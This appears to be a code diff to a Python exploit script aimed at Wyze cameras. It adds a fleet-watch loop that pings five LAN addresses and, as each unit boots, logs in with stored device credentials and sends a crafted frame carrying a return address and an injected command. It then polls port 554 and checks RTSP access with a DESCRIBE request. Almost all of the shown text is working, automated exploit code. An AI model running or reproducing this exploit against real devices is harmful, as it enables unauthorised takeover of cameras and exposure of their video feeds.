@@ -35,6 +35,7 @@ import hashlib
 import os
 import socket
 import struct
+import subprocess  # nosec B404 - ping only, fixed argv, no shell
 import sys
 import time
 
@@ -246,6 +247,88 @@ class Mock:
         c.close()
 
 
+FLEET = ("192.168.4.23", "192.168.4.24", "192.168.5.181",
+         "192.168.5.242", "192.168.6.65")
+FLEET_INTERVAL = 30      # s between full-fleet pings
+BOOT_GRACE = 20          # s after first ICMP before the frame: userspace settle
+
+CFG_DIR = os.path.expanduser("~/fss-exploit/cfg")
+
+
+def cfg_for(ip: str) -> tuple[str, str, str] | None:
+    """uid/enr/mac from the operator cfg store (same files e2e_capture.sh uses)."""
+    import json
+    path = os.path.join(CFG_DIR, f"{ip}.json")
+    try:
+        d = json.load(open(path))
+        return d["uid"], d["enr"], d["mac"]
+    except (OSError, KeyError, ValueError):
+        return None
+
+
+def ping(ip: str) -> bool:
+    return subprocess.run(  # nosec - returncode IS the check
+        ["ping", "-c", "1", "-t", "2", ip],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    ).returncode == 0
+
+
+def fire(ip: str, uid: str, enr: str, mac: str, a: argparse.Namespace,
+         cmd: bytes) -> tuple[bool, int | None]:
+    """One real attempt: login, frame, 554 poll, one DESCRIBE.
+
+    Returns (listened, describe_status)."""
+    try:
+        cam = W.Cam(ip, mac, uid, enr)
+        cam.full_login()
+    except Exception as e:
+        print(f"{ip}: session failed: {e}")
+        return False, None
+    frame = build_frame(cmd, a.ra, a.ra_off, a.cmd_off,
+                        a.declared, a.channel, frame_no=int(time.time()) & 0x7FFF)
+    send_frame(cam, frame)
+    print(f"{ip}: frame sent {len(frame)}B ra={a.ra:#x} ra_off={a.ra_off} "
+          f"cmd_off={a.cmd_off} declared={a.declared}")
+    up = poll_554(ip, a.poll_secs)
+    print(f"{ip}: 554 listening: {up}")
+    if not up:
+        return False, None
+    status, transcript = digest_describe(ip, a.user, a.pwd, a.realm)
+    print(f"{ip}: DESCRIBE -> {status}")
+    print(transcript)
+    return True, status
+
+
+def loop_watch(a: argparse.Namespace, cmd: bytes) -> int:
+    """Fleet watch: ping all known Wyze addresses every FLEET_INTERVAL s; on
+    first ICMP answer wait BOOT_GRACE for userspace, fire the frame once, run
+    the DESCRIBE check, and record the outcome. Units already fired are
+    skipped for the life of the process."""
+    pending = list(a.targets or FLEET)
+    fired: dict[str, tuple[bool, int | None]] = {}
+    print(f"watch: fleet={pending} interval={FLEET_INTERVAL}s grace={BOOT_GRACE}s")
+    while pending:
+        for ip in list(pending):
+            if not ping(ip):
+                continue
+            print(f"{ip}: ICMP up at {time.strftime('%H:%M:%S')}, "
+                  f"waiting {BOOT_GRACE}s for userspace")
+            time.sleep(BOOT_GRACE)
+            cfg = cfg_for(ip)
+            if cfg is None:
+                print(f"{ip}: no cfg in {CFG_DIR}, cannot fire")
+            else:
+                fired[ip] = fire(ip, *cfg, a, cmd)
+            pending.remove(ip)
+        if pending:
+            time.sleep(FLEET_INTERVAL)
+    print("watch: fleet exhausted")
+    for ip, (up, st) in fired.items():
+        print(f"  {ip}: listened={up} describe={st}")
+    return 0 if any(st == 200 for _, st in fired.values()) else 1
+
+
 def main() -> int:
     ap = argparse.ArgumentParser()
     ap.add_argument("--ip", default="192.168.4.24")
@@ -264,42 +347,35 @@ def main() -> int:
     ap.add_argument("--poll-secs", type=int, default=120)
     ap.add_argument("--dry", action="store_true",
                     help="mock RTSP server instead of the camera frame")
+    ap.add_argument("--loop-watch", action="store_true",
+                    help="watch the whole fleet and fire on first ICMP answer")
+    ap.add_argument("--targets", nargs="*", help="override the fleet list")
     a = ap.parse_args()
 
-    cmd = build_command(a.user, a.realm, a.pwd)
-    print(f"cmd ({len(cmd)}B): {cmd}")
+    cmd = build_command(a.user, a.realm, a.pwd).encode()
+    print(f"cmd ({len(cmd)}B): {cmd.decode()}")
+
+    if a.loop_watch:
+        return loop_watch(a, cmd)
 
     if a.dry:
         mock = Mock(a.user, a.pwd, a.realm)
         ip, port = "127.0.0.1", mock.port
         print(f"dry: mock rtsp on {ip}:{port}")
         # exercise the frame builder too: nothing goes on the wire
-        frame = build_frame(cmd.encode(), a.ra, a.ra_off, a.cmd_off,
+        frame = build_frame(cmd, a.ra, a.ra_off, a.cmd_off,
                             a.declared, a.channel, frame_no=1)
         print(f"dry: frame built, {len(frame)}B "
               f"(ra@{a.ra_off}={a.ra:#x}, cmd@{a.cmd_off})")
-        up = True
+        status, transcript = digest_describe(ip, a.user, a.pwd, a.realm, port=port)
     else:
-        ip, port = a.ip, 554
-        try:
-            cam = W.Cam(a.ip, a.mac, a.uid, a.enr)
-            cam.full_login()
-        except Exception as e:
-            print(f"session failed: {e}")
-            return 3
-        frame = build_frame(cmd.encode(), a.ra, a.ra_off, a.cmd_off,
-                            a.declared, a.channel, frame_no=int(time.time()) & 0x7FFF)
-        send_frame(cam, frame)
-        print(f"frame sent: {len(frame)}B ra={a.ra:#x} ra_off={a.ra_off} "
-              f"cmd_off={a.cmd_off} declared={a.declared}")
-        up = poll_554(ip, a.poll_secs)
-        print(f"554 listening: {up}")
+        up, status = fire(a.ip, a.uid, a.enr, a.mac, a, cmd)
+        if not up:
+            return 1
 
-    if not up:
-        return 1
-    status, transcript = digest_describe(ip, a.user, a.pwd, a.realm, port=port)
-    print(f"DESCRIBE -> {status}")
-    print(transcript)
+    if a.dry:
+        print(f"DESCRIBE -> {status}")
+        print(transcript)
     if status == 200:
         return 0
     if status is None:
